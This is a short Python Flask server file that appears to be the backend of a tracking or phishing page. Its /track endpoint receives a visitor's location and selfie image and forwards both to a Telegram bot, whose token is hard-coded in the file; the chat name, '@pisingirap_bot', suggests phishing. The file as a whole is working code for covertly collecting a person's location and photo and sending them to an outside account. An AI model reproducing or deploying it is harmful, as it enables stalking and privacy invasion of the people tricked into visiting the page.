# main.py
from flask import Flask, render_template, request, jsonify
from telegram import Bot
import os
import json

app = Flask(__name__)
bot = Bot(token="7795086037:AAFP4ArjOZSjQXZKmIzhHgIeFmU_oFHghHw")

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/track", methods=["POST"])
def track():
    data = request.json
    if data:
        location = data.get("location")
        selfie = data.get("selfie")
        
        if location:
            bot.send_message(chat_id="@pisingirap_bot", text=f"Location: {location}")
        if selfie:
            bot.send_photo(chat_id="@pisingirap_bot", photo=selfie)
    return jsonify({"status": "success"})

if __name__ == "__main__":
    app.run(debug=True)